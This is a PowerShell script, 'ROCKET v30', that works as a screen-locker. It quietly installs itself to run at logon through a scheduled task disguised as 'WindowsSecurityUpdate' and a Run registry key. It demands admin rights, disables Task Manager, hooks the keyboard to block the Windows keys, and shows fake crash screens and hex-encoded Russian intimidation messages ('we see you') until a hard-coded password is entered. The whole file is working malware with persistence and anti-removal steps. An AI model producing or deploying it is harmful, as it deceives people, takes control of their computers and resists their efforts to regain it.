# ROCKET v30 - BLACK "VAS ZAMETILI" intro + before each FLASH
Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

# ==================== HIDDEN AUTOSTART (silent) ====================
try {
    $taskName = 'WindowsSecurityUpdate'
    $selfPath = $PSCommandPath
    if (-not $selfPath) { $selfPath = $MyInvocation.MyCommand.Path }
    $existing = Get-ScheduledTask -TaskName $taskName -ErrorAction SilentlyContinue
    if (-not $existing) {
        $action = New-ScheduledTaskAction -Execute 'powershell.exe' `
            -Argument "-WindowStyle Hidden -sta -ExecutionPolicy Bypass -File `"$selfPath`""
        $trigger = New-ScheduledTaskTrigger -AtLogOn
        $trigger.Delay = 'PT5S'
        $principal = New-ScheduledTaskPrincipal -UserId "$env:USERDOMAIN\$env:USERNAME" `
            -LogonType Interactive -RunLevel Highest
        $settings = New-ScheduledTaskSettingsSet -Hidden `
            -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries `
            -ExecutionTimeLimit ([TimeSpan]::Zero) -StartWhenAvailable `
            -DisallowHardTerminate -Priority 4
        Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger `
            -Principal $principal -Settings $settings -Force -ErrorAction SilentlyContinue | Out-Null
    }
    $runKey = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run'
    if (Test-Path $runKey) {
        $cmdLine = "powershell.exe -WindowStyle Hidden -sta -ExecutionPolicy Bypass -File `"$selfPath`""
        $cur = (Get-ItemProperty -Path $runKey -Name $taskName -ErrorAction SilentlyContinue).$taskName
        if (-not $cur) {
            Set-ItemProperty -Path $runKey -Name $taskName -Value $cmdLine -Force -ErrorAction SilentlyContinue
        }
    }
} catch { }
# ===================================================================

$cur = [Security.Principal.WindowsIdentity]::GetCurrent()
$prin = New-Object Security.Principal.WindowsPrincipal($cur)
if (-not $prin.IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)) {
    try { Start-Process powershell -Verb RunAs -ArgumentList '-sta','-ExecutionPolicy','Bypass','-File',"`"$PSCommandPath`"" }
    catch { [System.Windows.Forms.MessageBox]::Show("Elevation failed: $($_.Exception.Message)", "Rocket") | Out-Null }
    exit
}

$R = 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Policies\System'
if (-not (Test-Path $R)) { New-Item $R -Force | Out-Null }
New-ItemProperty $R -Name DisableTaskMgr -Value 1 -PropertyType DWord -Force | Out-Null

$hookOk = $false
try {
    if (-not ([System.Management.Automation.PSTypeName]'WB').Type) {
        $cs = @(
'using System;',
'using System.Runtime.InteropServices;',
'public class WB {',
'    [DllImport("user32.dll")] public static extern IntPtr SetWindowsHookEx(int h, HookProc p, IntPtr m, uint t);',
'    [DllImport("user32.dll")] public static extern bool UnhookWindowsHookEx(IntPtr h);',
'    [DllImport("user32.dll")] public static extern IntPtr CallNextHookEx(IntPtr h, int n, IntPtr w, IntPtr l);',
'    [DllImport("kernel32.dll", CharSet=CharSet.Auto)] public static extern IntPtr GetModuleHandle(string s);',
'    [DllImport("user32.dll")] public static extern short GetAsyncKeyState(int vk);',
'    public delegate IntPtr HookProc(int n, IntPtr w, IntPtr l);',
'    static HookProc p = CB;',
'    static IntPtr hk = IntPtr.Zero;',
'    public static void I() { if (hk == IntPtr.Zero) hk = SetWindowsHookEx(13, p, GetModuleHandle(null), 0); }',
'    public static void U() { if (hk != IntPtr.Zero) { UnhookWindowsHookEx(hk); hk = IntPtr.Zero; } }',
'    public static bool Emergency() {',
'        bool sh = (GetAsyncKeyState(0x10) & 0x8000) != 0;',
'        bool es = (GetAsyncKeyState(0x1B) & 0x8000) != 0;',
'        bool f3 = (GetAsyncKeyState(0x72) & 0x8000) != 0;',
'        return sh && es && f3;',
'    }',
'    static IntPtr CB(int n, IntPtr w, IntPtr l) {',
'        if (n >= 0) {',
'            int m = (int)w;',
'            if (m == 0x0100 || m == 0x0104 || m == 0x0101 || m == 0x0105) {',
'                int v = Marshal.ReadInt32(l);',
'                if (v == 0x5B || v == 0x5C) return (IntPtr)1;',
'            }',
'        }',
'        return CallNextHookEx(hk, n, w, l);',
'    }',
'}'
        ) -join "`n"
        Add-Type -TypeDefinition $cs
    }
    [WB]::I()
    $hookOk = $true
} catch {}

function U([string]$h) { -join ($h.Split(' ') | Where-Object { $_ } | ForEach-Object { [char][Convert]::ToInt32($_,16) }) }

$S_T = U "0421 0418 0421 0422 0415 041C 0410 0020 0417 0410 0411 041B 041E 041A 0418 0420 041E 0412 0410 041D 0410"
$S_S = U "0412 0432 0435 0434 0438 0442 0435 0020 043F 0430 0440 043E 043B 044C"
$S_OK = U "041E 041A"
$S_W = U "041D 0435 0432 0435 0440 043D 043E"
$S_E = U "041E 0448 0438 0431 043A 0430"
# "ВАС ЗАМЕТИЛИ"
$S_NOTICED = U "0412 0410 0421 0020 0417 0410 041C 0415 0422 0418 041B 0418"
# "МЫ ВИДИМ ВАС"
$S_WESEE = U "041C 042B 0020 0412 0418 0414 0418 041C 0020 0412 0410 0421"
# "НЕ ПЫТАЙСЯ СКРЫТЬСЯ"
$S_DONT = U "041D 0415 0020 041F 042B 0422 0410 0419 0421 042F 0020 0421 041A 0420 042B 0422 042C 0421 042F"

$script:st = $false
$script:phase = 'BLACK'
$script:phaseStart = [DateTime]::Now
$script:flashSec = -1
$script:blackNext = 'RSOD_INIT'
$script:blackDur = 4.0

# ==================== BLACK "VAS ZAMETILI" ====================
$blk = New-Object System.Windows.Forms.Form
$blk.FormBorderStyle='None'; $blk.WindowState='Maximized'; $blk.TopMost=$true
$blk.BackColor='Black'; $blk.ShowInTaskbar=$false

$blkTitle = New-Object System.Windows.Forms.Label
$blkTitle.Text=$S_NOTICED
$blkTitle.AutoSize=$true
$blkTitle.ForeColor=[System.Drawing.Color]::FromArgb(255,30,30)
$blkTitle.BackColor='Transparent'
$blkTitle.Font=New-Object System.Drawing.Font('Consolas',80,[System.Drawing.FontStyle]::Bold)
$blk.Controls.Add($blkTitle)

$blkSub = New-Object System.Windows.Forms.Label
$blkSub.Text=$S_WESEE
$blkSub.AutoSize=$true
$blkSub.ForeColor=[System.Drawing.Color]::FromArgb(200,200,200)
$blkSub.BackColor='Transparent'
$blkSub.Font=New-Object System.Drawing.Font('Consolas',28,[System.Drawing.FontStyle]::Bold)
$blk.Controls.Add($blkSub)

$blkSub2 = New-Object System.Windows.Forms.Label
$blkSub2.Text=$S_DONT
$blkSub2.AutoSize=$true
$blkSub2.ForeColor=[System.Drawing.Color]::FromArgb(150,150,150)
$blkSub2.BackColor='Transparent'
$blkSub2.Font=New-Object System.Drawing.Font('Consolas',20)
$blk.Controls.Add($blkSub2)

function LayoutBlack {
    $w = $blk.ClientSize.Width; $h = $blk.ClientSize.Height
    $cx = [int]($w/2)
    $blkTitle.Left = [int]($cx - $blkTitle.Width / 2); $blkTitle.Top = [int]($h * 0.30)
    $blkSub.Left = [int]($cx - $blkSub.Width / 2); $blkSub.Top = $blkTitle.Top + $blkTitle.Height + 40
    $blkSub2.Left = [int]($cx - $blkSub2.Width / 2); $blkSub2.Top = $blkSub.Top + $blkSub.Height + 30
}
$blk.add_Load({ LayoutBlack })
$blk.add_Resize({ LayoutBlack })
# ============================================================

# RSOD
$rsod = New-Object System.Windows.Forms.Form
$rsod.FormBorderStyle='None'; $rsod.WindowState='Maximized'; $rsod.TopMost=$true
$rsod.BackColor=[System.Drawing.Color]::FromArgb(180,0,0); $rsod.ShowInTaskbar=$false
$rF = New-Object System.Windows.Forms.Label
$rF.Text=':('; $rF.AutoSize=$true; $rF.ForeColor='White'; $rF.BackColor='Transparent'
$rF.Font=New-Object System.Drawing.Font('Segoe UI',110); $rF.Location=New-Object System.Drawing.Point(100,100)
$rsod.Controls.Add($rF)
$rT = New-Object System.Windows.Forms.Label
$rT.Text='Your PC ran into a problem and needs to restart.'
$rT.AutoSize=$false; $rT.Width=900; $rT.Height=100
$rT.ForeColor='White'; $rT.BackColor='Transparent'
$rT.Font=New-Object System.Drawing.Font('Segoe UI',18); $rT.Location=New-Object System.Drawing.Point(100,300)
$rsod.Controls.Add($rT)
$rP = New-Object System.Windows.Forms.Label
$rP.Text='0% complete'; $rP.AutoSize=$true; $rP.ForeColor='White'; $rP.BackColor='Transparent'
$rP.Font=New-Object System.Drawing.Font('Segoe UI',18); $rP.Location=New-Object System.Drawing.Point(100,420)
$rsod.Controls.Add($rP)

# LOCKER
$lk = New-Object System.Windows.Forms.Form
$lk.FormBorderStyle='None'; $lk.WindowState='Maximized'; $lk.TopMost=$true
$lk.BackColor=[System.Drawing.Color]::FromArgb(110,0,0); $lk.ShowInTaskbar=$false

$lT = New-Object System.Windows.Forms.Label
$lT.Text=$S_T; $lT.AutoSize=$true; $lT.ForeColor='White'; $lT.BackColor='Transparent'
$lT.Font=New-Object System.Drawing.Font('Segoe UI',28,[System.Drawing.FontStyle]::Bold)
$lk.Controls.Add($lT)

$lS = New-Object System.Windows.Forms.Label
$lS.Text=$S_S; $lS.AutoSize=$true; $lS.ForeColor='LightGray'; $lS.BackColor='Transparent'
$lS.Font=New-Object System.Drawing.Font('Segoe UI',16)
$lk.Controls.Add($lS)

$txt = New-Object System.Windows.Forms.TextBox
$txt.UseSystemPasswordChar=$true
$txt.Font=New-Object System.Drawing.Font('Consolas',40,[System.Drawing.FontStyle]::Bold)
$txt.Size=New-Object System.Drawing.Size(500,80)
$txt.BackColor='White'; $txt.ForeColor='Black'
$txt.TextAlign='Center'; $txt.BorderStyle='FixedSingle'
$lk.Controls.Add($txt)

$okBtn = New-Object System.Windows.Forms.Button
$okBtn.Text=$S_OK
$okBtn.Font=New-Object System.Drawing.Font('Segoe UI',24,[System.Drawing.FontStyle]::Bold)
$okBtn.BackColor=[System.Drawing.Color]::FromArgb(0,140,0)
$okBtn.ForeColor='White'; $okBtn.FlatStyle='Flat'
$okBtn.Size=New-Object System.Drawing.Size(250,80)
$lk.Controls.Add($okBtn)

$lC = New-Object System.Windows.Forms.Label
$lC.Text='15'; $lC.AutoSize=$true; $lC.ForeColor='Yellow'; $lC.BackColor='Transparent'
$lC.Font=New-Object System.Drawing.Font('Segoe UI',48,[System.Drawing.FontStyle]::Bold)
$lk.Controls.Add($lC)

$lk.add_FormClosing({ param($s,$e) if (-not $script:st) { $e.Cancel=$true } })

function LayoutLocker {
    $w = $lk.ClientSize.Width; $h = $lk.ClientSize.Height
    $cx = [int]($w / 2); $cy = [int]($h / 2)
    $lT.Left = [int]($cx - $lT.Width / 2); $lT.Top = [int]($h * 0.10)
    $lS.Left = [int]($cx - $lS.Width / 2); $lS.Top = $lT.Top + $lT.Height + 20
    $txt.Left = [int]($cx - $txt.Width / 2); $txt.Top = $cy - $txt.Height - 10
    $okBtn.Left = [int]($cx - $okBtn.Width / 2); $okBtn.Top = $txt.Top + $txt.Height + 20
    $lC.Left = [int]($w - $lC.Width - 60); $lC.Top = [int]($h - $lC.Height - 40)
}
$lk.add_Load({ LayoutLocker })
$lk.add_Resize({ LayoutLocker })

# BSOD
$bs = New-Object System.Windows.Forms.Form
$bs.FormBorderStyle='None'; $bs.WindowState='Maximized'; $bs.TopMost=$true
$bs.BackColor=[System.Drawing.Color]::FromArgb(0,120,215); $bs.ShowInTaskbar=$false
$bF = New-Object System.Windows.Forms.Label
$bF.Text=':('; $bF.AutoSize=$true; $bF.ForeColor='White'; $bF.BackColor='Transparent'
$bF.Font=New-Object System.Drawing.Font('Segoe UI',110); $bF.Location=New-Object System.Drawing.Point(100,100)
$bs.Controls.Add($bF)
$bT = New-Object System.Windows.Forms.Label
$bT.Text='Your PC ran into a problem and needs to restart.'
$bT.AutoSize=$false; $bT.Width=900; $bT.Height=100
$bT.ForeColor='White'; $bT.BackColor='Transparent'
$bT.Font=New-Object System.Drawing.Font('Segoe UI',18); $bT.Location=New-Object System.Drawing.Point(100,300)
$bs.Controls.Add($bT)
$bP = New-Object System.Windows.Forms.Label
$bP.Text='0% complete'; $bP.AutoSize=$true; $bP.ForeColor='White'; $bP.BackColor='Transparent'
$bP.Font=New-Object System.Drawing.Font('Segoe UI',18); $bP.Location=New-Object System.Drawing.Point(100,420)
$bs.Controls.Add($bP)

function SetPhase($p) {
    $rsod.Hide(); $lk.Hide(); $bs.Hide(); $blk.Hide()
    $script:phase = $p
    $script:phaseStart = [DateTime]::Now
    $script:flashSec = -1
    if ($p -eq 'BLACK') {
        $blk.Show(); $blk.BringToFront(); $blk.Activate(); LayoutBlack
    }
    elseif ($p -eq 'RSOD_INIT') {
        $rP.Text='0% complete'
        $rsod.Show(); $rsod.BringToFront(); $rsod.Activate()
    }
    elseif ($p -eq 'LOCKER') {
        $lC.Text='15'
        $txt.Clear()
$lk.Show(); $lk.BringToFront(); $lk.Activate(); LayoutLocker
        $txt.Focus() | Out-Null
    }
    elseif ($p -eq 'FLASH') {
        $bP.Text='0% complete'
        $bs.Show(); $bs.BringToFront(); $bs.Activate()
    }
}

function Done {
    $script:st = $true
    $mt.Stop(); $emgT.Stop()
    if ($hookOk) { try { [WB]::U() } catch {} }
    try { Set-ItemProperty $R -Name DisableTaskMgr -Value 0 -Type DWord } catch {}
    $rsod.Hide(); $lk.Hide(); $bs.Hide(); $blk.Hide()
    [System.Windows.Forms.Application]::Exit()
}

$okBtn.add_Click({
    if ($txt.Text -eq '5559') { Done }
    else {
        [System.Windows.Forms.MessageBox]::Show($S_W,$S_E,'OK','Error') | Out-Null
        $txt.Clear(); $txt.Focus() | Out-Null
    }
})

$txt.add_KeyDown({
    if ($_.KeyCode -eq [System.Windows.Forms.Keys]::Enter) {
        $okBtn.PerformClick(); $_.SuppressKeyPress = $true
    }
})

$mt = New-Object System.Windows.Forms.Timer
$mt.Interval = 100
$mt.add_Tick({
    if ($script:st) { return }
    $el = ([DateTime]::Now - $script:phaseStart).TotalSeconds

    if ($script:phase -eq 'BLACK') {
        if ($el -ge $script:blackDur) {
            if ($script:blackNext -eq 'RSOD_INIT') { SetPhase 'RSOD_INIT' }
            else { SetPhase 'FLASH' }
        }
    }
    elseif ($script:phase -eq 'RSOD_INIT') {
        $p = 0
        if ($el -ge 14) { $p=100 } elseif ($el -ge 13) { $p=90 } elseif ($el -ge 12) { $p=75 }
        elseif ($el -ge 9) { $p=50 } elseif ($el -ge 6) { $p=25 } elseif ($el -ge 3) { $p=10 }
        $rP.Text = "$p% complete"
        if ($el -ge 15) { SetPhase 'LOCKER' }
    }
    elseif ($script:phase -eq 'LOCKER') {
        $r = 15 - [int][Math]::Ceiling($el)
        if ($r -lt 0) { $r=0 }
        $lC.Text = "$r"
        if ($el -ge 15) {
            $script:blackNext = 'FLASH'
            $script:blackDur = 3.0
            SetPhase 'BLACK'
        }
    }
    elseif ($script:phase -eq 'FLASH') {
        $sec = [int][Math]::Floor($el)
        if ($sec -ne $script:flashSec) {
            $script:flashSec = $sec
            if ($sec % 2 -eq 0) { $rsod.Hide(); $bs.Show(); $bs.BringToFront() }
            else { $bs.Hide(); $rsod.Show(); $rsod.BringToFront() }
        }
        $p = [int](($el - $sec) * 100); if ($p -gt 100) { $p=100 }
        if ($sec % 2 -eq 0) { $bP.Text = "$p% complete" } else { $rP.Text = "$p% complete" }
        if ($el -ge 10) { SetPhase 'LOCKER' }
    }
})

$emgT = New-Object System.Windows.Forms.Timer
$emgT.Interval = 80
$emgT.add_Tick({
    if ($script:st) { return }
    try { if ([WB]::Emergency()) { Done } } catch {}
})

# ==== START ====
$script:blackNext = 'RSOD_INIT'
$script:blackDur = 4.0
SetPhase 'BLACK'
$mt.Start()
$emgT.Start()
[System.Windows.Forms.Application]::Run($blk)

if ($hookOk) { try { [WB]::U() } catch {} }
try { Set-ItemProperty $R -Name DisableTaskMgr -Value 0 -Type DWord } catch {}
